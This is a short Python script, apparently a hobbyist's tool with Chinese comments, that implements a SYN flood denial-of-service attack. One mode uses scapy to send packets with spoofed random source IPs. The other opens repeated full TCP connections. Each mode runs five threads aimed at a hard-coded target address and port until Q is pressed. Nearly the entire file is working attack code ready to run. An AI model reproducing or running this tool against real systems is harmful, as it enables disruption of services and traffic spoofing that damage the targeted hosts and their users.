# -*- coding = utf-8 -*-
# @TIME :  15:46
# @Author : 晓晓鲸鱼
# @File : syn.py
# @Software : PyCharm
# @脚本说明 : SYN泛洪
import random

from scapy.all import *
from scapy.layers.inet import IP, TCP
import keyboard
import socket
# 禁用scapy的报错
import logging
logging.getLogger("scapy").setLevel(logging.ERROR)


class SYN:
    def __init__(self):
        self.num = 0

    def __syn_half(self, ip, port):
        """SYN半连接攻击"""
        # send.conf.verb = 0  # 关闭所有报错
        while True:
            if keyboard.is_pressed('q'):    # 判断是否结束循环
                break
            rand_sport = random.randint(10000, 50000)     # 随机端口
            rand_seq = random.randint(10000, 50000)  # 随机seq
            pkg = IP(src=RandIP(), dst=ip)/TCP(dport=port, sport=rand_sport, seq=rand_seq)
            send(pkg, verbose=False)
            self.num += 1
            print(f"\r [*]  已经发包 {self.num} 个", end="", flush=True)


    def __syn_fully(self, ip, port):
        """syn全连接攻击"""
        while True:
            try:
                if keyboard.is_pressed('q'):    # 判断是否结束循环
                    break
                sock = socket.socket()
                sock.settimeout(1)
                sock.connect((ip, port))
                self.num += 1
                print(f"\r [*]  已经发包 {self.num} 个", end="", flush=True)
            except:
                pass

            # syn = IP(dst=ip) / TCP(dport=port, flags='S', seq=1234)
            # resp = sr1(syn)
            # if resp["TCP"].flags == "SA":
            #     ack = IP(dst=ip) / TCP(dport=port, flags="A", ack=resp["TCP"].seq + 1)
            #     send(ack, verbose=False)
            #     self.num += 1
            #     print(f"\r\033[33m[+]\033[0m 已经发包 \033[31m{self.num}\033[0m 个", end="", flush=True)

    def start(self, ip, port, mode):
        if mode == "1":
            print("[SYN半连接攻击 之 随机原地址(内网打外网无效!)] Q退出")
            for i in range(5):
                threading.Thread(target=self.__syn_half, args=(ip, port)).start()
        if mode == "2":
            print("[SYN全连接攻击] Q退出")
            for i in range(5):
                threading.Thread(target=self.__syn_fully, args=(ip, port)).start()


if __name__ == '__main__':
    a = SYN()
    a.start("192.168.11.12", 80, "2")
